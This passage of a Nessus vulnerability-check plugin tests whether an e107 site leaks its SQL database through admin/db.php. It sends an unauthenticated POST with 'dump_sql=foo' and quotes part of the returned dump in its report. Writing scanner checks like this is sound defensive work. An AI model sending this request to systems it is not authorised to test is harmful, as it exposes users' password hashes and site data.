 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from an
information disclosure flaw. 

Description :

There is a flaw in the remote installation of e107 - the script
'admin/db.php' lets anyone obtain a dump of the remote SQL database by
sending the proper request to the remote server.  An attacker may use
this flaw to obtain the MD5 hashes of the passwords of the users of
this web site. 

See also :

http://www.securityfocus.com/archive/1/330332

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if(description)
{
 script_id(11805);
 script_bugtraq_id(8273);
 script_version("$Revision: 1.8 $");
 name["english"] = "e107 database dump";
 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "e107 flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencies("e107_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


data = "dump_sql=foo";


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  if ( is_cgi_installed_ka(item:dir + "/admin/db.php", port:port) ) {
    host = get_host_name();
    req = string("POST ", dir, "/admin/db.php HTTP/1.1\n", "Host: ", host, "\r\n", 
    	 	"Content-Type: application/x-www-form-urlencoded\r\n", 
		"Content-Length: ", strlen(data), "\r\n\r\n", data);

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (buf == NULL)exit(0);

    if ("e107 sql-dump" >< buf) {
      if (report_verbosity > 0) {
        db = strstr(buf, '\r\n\r\n');
        if (db) db = substr(db, 0, 255);
        else db = buf;

        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here is an extract of the dump of the remote database.\n",
          "\n",
          db
        );
      }
      else report = desc["english"];

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
